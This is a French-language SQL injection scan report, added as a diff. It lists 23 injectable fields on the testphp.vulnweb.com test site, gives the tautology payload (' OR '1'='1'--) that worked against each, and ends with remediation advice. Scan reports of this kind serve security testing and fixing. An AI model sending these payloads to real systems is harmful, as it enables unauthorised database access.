@@ -1,0 +1,179 @@
+
+==============================================
+RAPPORT DE SCAN DE VULNÉRABILITÉS SQLi
+==============================================
+Date: 2025-03-03 20:23:39
+Cible: http://testphp.vulnweb.com
+URLs scannées: 11
+Vulnérabilités trouvées: 23
+
+VULNÉRABILITÉS DÉTECTÉES:
+
+[1] Error-based SQLi
+    URL: http://testphp.vulnweb.com
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:19:58
+
+[2] Error-based SQLi
+    URL: http://testphp.vulnweb.com/index.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:20:14
+
+[3] Error-based SQLi
+    URL: http://testphp.vulnweb.com/cart.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:20:37
+
+[4] Error-based SQLi
+    URL: http://testphp.vulnweb.com/guestbook.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:21:03
+
+[5] Error-based SQLi
+    URL: http://testphp.vulnweb.com/login.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: uname
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:21:24
+
+[6] Error-based SQLi
+    URL: http://testphp.vulnweb.com/login.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: pass
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:21:26
+
+[7] Error-based SQLi
+    URL: http://testphp.vulnweb.com/login.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:21:29
+
+[8] Error-based SQLi
+    URL: http://testphp.vulnweb.com/disclaimer.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:21:51
+
+[9] Error-based SQLi
+    URL: http://testphp.vulnweb.com/categories.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:09
+
+[10] Error-based SQLi
+    URL: http://testphp.vulnweb.com/categories.php
+    Formulaire: http://testphp.vulnweb.com/listproducts.php?cat=1 [Méthode: GET]
+    Champ vulnérable: cat
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:22:24
+
+[11] Error-based SQLi
+    URL: http://testphp.vulnweb.com/categories.php
+    Formulaire: http://testphp.vulnweb.com/listproducts.php?cat=2 [Méthode: GET]
+    Champ vulnérable: cat
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:22:27
+
+[12] Error-based SQLi
+    URL: http://testphp.vulnweb.com/categories.php
+    Formulaire: http://testphp.vulnweb.com/listproducts.php?cat=3 [Méthode: GET]
+    Champ vulnérable: cat
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:22:30
+
+[13] Error-based SQLi
+    URL: http://testphp.vulnweb.com/categories.php
+    Formulaire: http://testphp.vulnweb.com/listproducts.php?cat=4 [Méthode: GET]
+    Champ vulnérable: cat
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:22:33
+
+[14] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: urname
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:42
+
+[15] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: ucc
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:45
+
+[16] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: uemail
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:48
+
+[17] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: uphone
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:50
+
+[18] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/userinfo.php [Méthode: POST]
+    Champ vulnérable: uaddress
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:53
+
+[19] Error-based SQLi
+    URL: http://testphp.vulnweb.com/userinfo.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:22:55
+
+[20] Error-based SQLi
+    URL: http://testphp.vulnweb.com/artists.php
+    Formulaire: http://testphp.vulnweb.com/search.php?test=query [Méthode: POST]
+    Champ vulnérable: searchFor
+    Payload efficace: ' OR '1'='1'--
+    Détecté à: 2025-03-03 20:23:13
+
+[21] Error-based SQLi
+    URL: http://testphp.vulnweb.com/artists.php
+    Formulaire: http://testphp.vulnweb.com/artists.php?artist=1 [Méthode: GET]
+    Champ vulnérable: artist
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:23:27
+
+[22] Error-based SQLi
+    URL: http://testphp.vulnweb.com/artists.php
+    Formulaire: http://testphp.vulnweb.com/artists.php?artist=2 [Méthode: GET]
+    Champ vulnérable: artist
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:23:30
+
+[23] Error-based SQLi
+    URL: http://testphp.vulnweb.com/artists.php
+    Formulaire: http://testphp.vulnweb.com/artists.php?artist=3 [Méthode: GET]
+    Champ vulnérable: artist
+    Payload efficace: ' OR '1'='1
+    Détecté à: 2025-03-03 20:23:33
+
+==============================================
+RECOMMANDATIONS:
+1. Utiliser des requêtes préparées ou des ORM
+2. Valider et assainir toutes les entrées utilisateur
+3. Implémenter un principe de moindre privilège pour les comptes DB
+4. Activer les pare-feu applicatifs web (WAF)
+==============================================
